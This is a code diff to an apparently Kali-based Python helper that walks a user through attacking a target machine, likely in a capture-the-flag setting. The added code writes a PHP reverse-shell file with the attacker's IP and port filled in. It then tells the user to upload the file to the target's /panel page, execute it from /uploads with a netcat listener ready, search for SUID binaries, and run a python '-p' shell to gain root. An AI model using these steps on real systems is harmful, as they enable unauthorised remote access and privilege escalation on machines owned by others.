@@ -1,5 +1,6 @@
 from inspect import Parameter
 import os
+import getpass
 from numpy import mat
 from packaging import version
 from subprocess import Popen, PIPE
@@ -95,7 +96,6 @@ class Function():
         return Data, match
 
     def metasploit(func_in, Data, args, block_In, block_Out, block_hint):
-        
         script_name = ""
         for arg in args:
             if ".rc" in arg:
@@ -153,27 +153,45 @@ class Function():
                 return Data, match
         # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
         match = check_output_data(Data, block_Out)
-        return Data, match
+        # return Data, match
 
-    def create_file(func_in, Data, args, block_In, block_Out, block_hint):      
+    def create_file(func_in, Data, args, block_In, block_Out, block_hint):
         try:
-            with open('/home/kali/Desktop/reverse_shell.php5', 'w') as f:
+            with open(f'/home/{getpass.getuser()}/Desktop/reverse_shell.php5', 'w') as f:
                 file = args[0]
-                for i in range(len(args)):
-                    file = file.replace("REPLACE_IT", Data[block_In[i]])
+                # for i in range(len(args)):
+                    # file = file.replace("REPLACE_IT_IP", Data[block_In[i]])
+                file = file.replace("REPLACE_IT_IP", Data[block_In[0]])
+                file = file.replace("REPLACE_IT_PORT", Data[block_In[1]])
                 f.write(file)
         except FileNotFoundError:
-            print('Fail to create a file on path:/home/kali/Desktop/')
-        
+            print(f'Fail to create a file on path:/home/{getpass.getuser()}/Desktop/')
+        print(f"\nGo to /home/{getpass.getuser()}/Desktop, you would find reverse_shell.php5.")
+        print(f"Upload it to the {Data['IP']}/panel page.")
+        print(f"Go to the {Data['IP']}/uploads page, click the file to execute (Make sure you listening to the port first).\n")
+        result = input("After you get shell, press enter to move on next step.\n")
         match = check_output_data(Data, block_Out)
         return Data, match
 
     def netcat(func_in, Data, args, block_In, block_Out, block_hint):
-        os.system(f"nc {Data['argument']} {func_in['port']}")
+        # os.system(f"nc {args} {func_in['port']}")
+        # proc = Popen(['nc', *args, func_in['port']], stdout=PIPE)
+        # print(f"Start listening to port {func_in['port']}.")
+        cmd = ""
+        for e in args:
+            cmd += e + " "
+        print(f'\nPlease open another terminal and enter `nc {cmd}{func_in["port"]}`.')
+        result = input("After done, press enter to move on next step.\n")
         match = check_output_data(Data, block_Out)
         return Data, match
 
     def get_root(func_in, Data, args, block_In, block_Out, block_hint):
+        print('\nPlease enter `find / -user root -perm -4000 -exec ls -ldb {} \; | grep root` in shell you got.')
+        result = input("If you see python has root permission, enter yes, else enter no.\n")
+        if result != "no":
+            print('\nEnter `python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'` in shell, and you will be root.\n')
+        else:
+            print("\nSorry we can't help :(\n")
         match = check_output_data(Data, block_Out)
         return Data, match
 
